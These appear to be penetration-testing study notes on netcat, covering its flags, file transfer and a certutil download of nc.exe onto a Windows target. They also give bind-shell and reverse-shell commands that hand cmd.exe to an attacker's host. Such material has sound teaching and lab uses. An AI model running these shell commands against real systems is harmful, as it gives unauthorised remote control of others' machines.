
# Overview
Netcat (nc) is a TCP/IP Swiss army knife that is great for seething up quick and easy connections or transferring information between two hosts.

# Usage
- `nc -nv 10.4.20.244 80`
- `nc -lnvp <port>` : set up netcat listener
- -n : --nodns
- -l : --listen
- -v : --verbose
- -p : source port
- -u : --udp
- -e : `--exec <command>`
## Send Files
Transfer netcat to Windows.
1. Inside `/usr/share/windows-binaries/` : go to folder
2. `python -m SimpleHTTPServer 80` : set up hosting of the files for DL on Win
3. `certutil -urlcache -f http://<IP>/nc.exe nc.exe` : download using windows utility and save to file "nc.exe"

Listener
```bash
nc -lnvp 1234 > test.txt
```
Sender
```bash
nc -nv <ip> 1234 < test.txt
```

## Bind_Shells
A Netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a client connects to the listener.

\[ Attacker ] >>>------> \[ Target ]

Target - Listener
```bash
nc -lnvp 1234 -e cmd.exe
```
Attacker - Sender
```bash
nc -nv <ip> 1234
```

## Reverse_Shells
The target initiates the connection to the attacker. Great for when there is a firewall in the way. Firewalls usually allow outbound connections.

\[ Attacker ] <------<<< \[ Target ]

Attacker - Listener
```bash
nc -lnvp 1234
```
Target - Sender
```bash
nc -nv <ip> 1234 -e cmd.exe
```
